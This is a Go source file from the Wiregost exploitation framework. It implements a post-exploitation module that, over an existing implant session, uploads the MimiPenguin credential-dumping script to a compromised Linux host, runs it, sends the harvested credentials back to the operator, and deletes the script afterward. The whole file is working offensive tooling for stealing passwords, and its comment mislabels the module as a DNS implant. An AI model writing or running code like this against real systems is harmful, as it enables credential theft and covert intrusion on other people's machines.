// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package MimiPenguin

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"path/filepath"
	"strings"
	"time"

	"github.com/gogo/protobuf/proto"

	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module/templates"
	"github.com/maxlandon/wiregost/util"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// MimiPenguin - A single stage DNS implant
type MimiPenguin struct {
	*templates.Module
}

// New - Instantiates a reverse DNS module, empty.
func New() *MimiPenguin {
	mod := &MimiPenguin{&templates.Module{}}
	mod.Path = []string{"post/linux/x64/bash/credentials/MimiPenguin"}
	return mod
}

var modLog = log.ServerLogger("post/linux/x64/bash/credentials/MimiPenguin", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

func (s *MimiPenguin) Run(requestID int32, command string) (result string, err error) {

	// Check options
	if ok, err := s.CheckRequiredOptions(); !ok {
		return "", err
	}

	// Check session
	sess, err := s.GetSession()
	if sess == nil {
		return "", err
	}

	// Options
	src := filepath.Join(assets.GetModulesDir(), strings.Join(s.Path, "/"), "src/mimipenguin.sh")
	rpath := filepath.Join(s.Options["TempDirectory"].Value, "mimipenguin.sh")

	// Upload MimiPenguin script on target
	fileBuf, err := ioutil.ReadFile(src)
	if err != nil {
		return "", err
	}
	uploadGzip := bytes.NewBuffer([]byte{})
	new(util.Gzip).Encode(uploadGzip, fileBuf)

	data, _ := proto.Marshal(&ghostpb.UploadReq{
		Encoder: "gzip",
		Path:    rpath,
		Data:    uploadGzip.Bytes(),
	})

	downloading := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
	s.ModuleEvent(requestID, downloading)

	timeout := time.Second * 30
	data, err = sess.Request(ghostpb.MsgUploadReq, timeout, data)
	if err != nil {
		return "", errors.New(err.Error())
	} else {
		s.ModuleEvent(requestID, "Done")
	}

	// Execute Script
	running := fmt.Sprintf("Running script ...")
	s.ModuleEvent(requestID, running)
	time.Sleep(time.Millisecond * 500)

	data, _ = proto.Marshal(&ghostpb.ExecuteReq{
		Path:   rpath,
		Output: true,
	})
	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		resp := ghostpb.Execute{}
		err := proto.Unmarshal(data, &resp)
		if err != nil {
			return "", err
		}

		res := fmt.Sprintf("Results:\n %s", resp.Result)
		s.ModuleEvent(requestID, res)
	}

	// Delete script
	deleting := fmt.Sprintf("Deleting script ...")
	s.ModuleEvent(requestID, deleting)

	data, _ = proto.Marshal(&ghostpb.RmReq{
		Path: rpath,
	})
	data, err = sess.Request(ghostpb.MsgRmReq, timeout, data)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(requestID, "Done")
	}

	return "Module executed", nil
}
